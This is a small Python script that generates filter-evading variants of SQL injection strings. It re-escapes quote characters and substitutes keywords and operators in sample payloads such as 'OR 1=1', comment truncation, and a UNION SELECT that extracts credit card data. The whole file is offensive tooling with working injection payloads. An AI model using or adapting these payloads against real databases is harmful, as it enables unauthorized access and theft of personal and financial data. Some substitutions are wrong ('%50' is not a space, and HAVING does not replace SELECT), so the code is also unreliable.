def check_and_generate_alternatives(attack_string):
    escaped_chars = ['\\', '\'', '\"']
    alternative_chars = ['\\\\', '\\\'', '\\\"']

    for i in range(len(escaped_chars)):
        if escaped_chars[i] in attack_string:
            alternative_string = attack_string.replace(escaped_chars[i], alternative_chars[i])
            print(f"Escaped character found: {escaped_chars[i]}")
            print(f"Alternative attack string: {alternative_string}")
            print()

def encoder(string):
    subs = []
    values = {" ": "%50", "SELECT": "HAVING", "AND": "&&", "OR": "||"}
    secondoriginalstring = string

    for key, value in values.items():
        if key in string:
            newstring = string.replace(key, value)
            subs.append(newstring)
        if key in secondoriginalstring:
            secondoriginalstring = secondoriginalstring.replace(key, value)
            subs.append(secondoriginalstring)

    subset = set(subs)
    return subset


# Example usage
attack_strings = [
    "SELECT * FROM users WHERE username = 'admin'",
    "SELECT * FROM users WHERE username = \"admin\" OR 1=1",
    "SELECT * FROM users WHERE username = 'admin' UNION SELECT credit_card_info FROM credit_cards",
    "SELECT * FROM users WHERE username = 'admin'/*"
]

for attack_string in attack_strings:
    check_and_generate_alternatives(attack_string)

originalstring = "' UNION SELECT * FROM Users WHERE username = 'admin' OR 1=1 AND username = 'admin'"

alternative_strings = encoder(originalstring)
print("Original String:")
print(originalstring)
print("Alternative Strings:")
for alternative in alternative_strings:
    print(alternative)
